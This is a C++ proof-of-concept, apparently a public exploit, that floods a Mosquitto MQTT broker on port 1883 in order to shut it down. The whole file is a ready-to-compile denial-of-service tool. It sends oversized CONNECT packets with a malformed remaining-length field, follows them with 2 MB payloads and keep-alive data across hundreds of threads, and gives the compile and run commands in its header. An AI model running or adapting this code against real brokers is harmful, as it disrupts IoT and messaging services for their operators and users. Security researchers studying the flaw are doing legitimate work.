//=====================================================================
//PoC C++ code
//=====================================================================
// Name        : MqttAttack.cpp
// Author      : Felipe Balabanian
// Version     : 1.0
// Company     : Samsung - SRBR
// Copyright   : Public Domain
// Description : Mosquitto Shutdown C++
// Compile     : g++ MqttAttack.cpp -std=c++11 -pthread -o MqttAttack
// Terminal    : ./MqttAttack 192.168.0.X
//======================================================================

void sendAttack();

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <unistd.h>
#include <vector>
#include <stdio.h>
#include <stdlib.h>

char* host;
int port=1883;
bool run = true;
int fails = 0;
int thclosed = 0;
int thcreated=0;
const char* payload;
const char* keeppayload;
const char initpayload[] = "\x10\xff\xff\xff\x0f\x00\x04\x4d\x51\x54\x54\x04\x02\x00\x0a\x00\x10\x43\x36\x38\x4e\x30\x31\x77\x75\x73\x4a\x31\x66\x78\x75\x38\x58";
unsigned long seconds = 1000000;

int main(int argc, char* argv[])
{
	printf("\e[92m\n              ___\n             (  \">\n              )(\n             // ) MQTT SHUTDOWN\n          --//\"\"--\n          -/------\n\e[39m\n");

	host = (char*) malloc(30);
	if(argc < 2){
		printf("Target IP: ");
		scanf("%s", host);
	}else{
		host = argv[1];
	}
	printf("Using Target IP= %s\n", host);

	payload = (char*) calloc(2097152,1);
	keeppayload = (char*) calloc(1024,1);

	printf("Press Enter to Start Attack\n");
	getchar();
	printf("Starting Attack\n");
	std::vector<std::thread> lista;
	int i;
	while(run){
			for(i=0;i<100;i++){
				try{
				lista.push_back(std::thread(sendAttack));
				}catch(int e){
					printf("%d", e);
				}
			}
		thcreated++;
		usleep(5*seconds);
		printf("\n======Status=======\n");
		printf("%d threads created\n", thcreated*100);
		printf("%d closed threads\n", thclosed);
		printf("%d fails threads\n", fails);
		printf("%d running threads\n", thcreated*100-thclosed-fails);

		//thcreated*100-thclosed-fails = live threads
		if(thcreated*100-thclosed-fails < 50){
			run=false;
		}

		usleep(55*seconds);
	}

	printf("Attack finished...\n");
	getchar();

	return 1;
}

void sendAttack()
{
	//printf("New Thread Created");
	int thisSocket;
	struct sockaddr_in destination;


	destination.sin_port = htons(port);
	destination.sin_family = AF_INET;
	destination.sin_addr.s_addr = inet_addr(host);
	thisSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (thisSocket < 0)
	{
		//printf("\nSocket Creation FAILED!");
		fails++;
		return;
	}


	if (connect(thisSocket,(struct sockaddr *)&destination,sizeof(destination))!=0)
	{
		//printf("\nSocket Connection FAILED!\n");
		if (thisSocket)
		{
			shutdown(thisSocket,SHUT_RDWR);
		}
		fails++;
		return;
	}
	//printf("\nConnected!");

	int ret;
	ret = send(thisSocket, initpayload, 33, MSG_NOSIGNAL);
	//printf("init payload sended");

	for(int i=0;i<15;i++){
		if(ret < 0){break;}
		ret = send(thisSocket, payload, 2097152, MSG_NOSIGNAL);
		usleep(0.1*seconds);
	}

	while(ret > 0){
		ret = send(thisSocket, keeppayload, 1024, MSG_NOSIGNAL);
		usleep(0.3*seconds);
	}
	thclosed++;
	shutdown(thisSocket,SHUT_RDWR);

	return;
}
